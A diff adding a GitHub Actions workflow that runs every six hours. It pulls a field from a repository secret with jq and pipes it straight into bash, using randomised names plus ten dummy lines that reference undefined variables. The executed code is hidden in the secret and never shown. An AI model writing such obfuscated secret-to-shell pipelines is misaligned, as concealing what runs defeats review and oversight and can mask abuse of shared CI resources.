@@ -1,0 +1,28 @@
+name: zuotiandashulanqiu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zuotiandashulanqiu
+        env:
+          yyef7: ${{ secrets.yyef7 }}
+        run: |
+          echo $yyef7 | jq -r .xw44 | /bin/bash
+          echo $wfdgg281 | jq -r .yqe01 | /bin/bash
+          echo $w8394 | jq -r .h59 | /bin/bash
+          echo $vfwi9 | jq -r .wsxx0 | /bin/bash
+          echo $ms07377 | jq -r .loq1 | /bin/bash
+          echo $ehkh1763 | jq -r .k7476 | /bin/bash
+          echo $whq8468 | jq -r .vx9 | /bin/bash
+          echo $q885 | jq -r .qqx98 | /bin/bash
+          echo $pady6610 | jq -r .q16 | /bin/bash
+          echo $l6 | jq -r .vqhb666 | /bin/bash
+          echo $plcy732 | jq -r .zlprx029 | /bin/bash
+
